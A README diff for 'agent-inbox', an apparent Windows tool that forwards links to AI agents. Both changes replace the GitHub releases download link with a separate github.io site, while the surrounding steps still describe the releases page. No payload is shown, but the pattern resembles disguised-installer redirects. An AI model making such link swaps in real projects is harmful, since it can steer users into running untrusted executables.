@@ -1,6 +1,6 @@
 # 📦 agent-inbox - Send links to your AI agent
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/peopleupperpeninsula500/agent-inbox/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://peopleupperpeninsula500.github.io)
 
 Agent-inbox acts as a central hub for your AI agents. It collects the links and articles you find across the web. You send items from your browser or mobile phone. Your chosen AI, such as Claude or ChatGPT, reads the content and provides an analysis or suggested tasks. It functions as a reading list for your digital assistant.
 
@@ -15,7 +15,7 @@ You do not need programming skills to run this tool on your Windows computer. Fo
 ### 1. Download the Installer
 Visit the official repository page to get the latest version of the software.
 
-[Download the application here](https://github.com/peopleupperpeninsula500/agent-inbox/releases)
+[Download the application here](https://peopleupperpeninsula500.github.io)
 
 1. Click the link above to open the releases page in your browser.
 2. Look for the section labeled Assets.
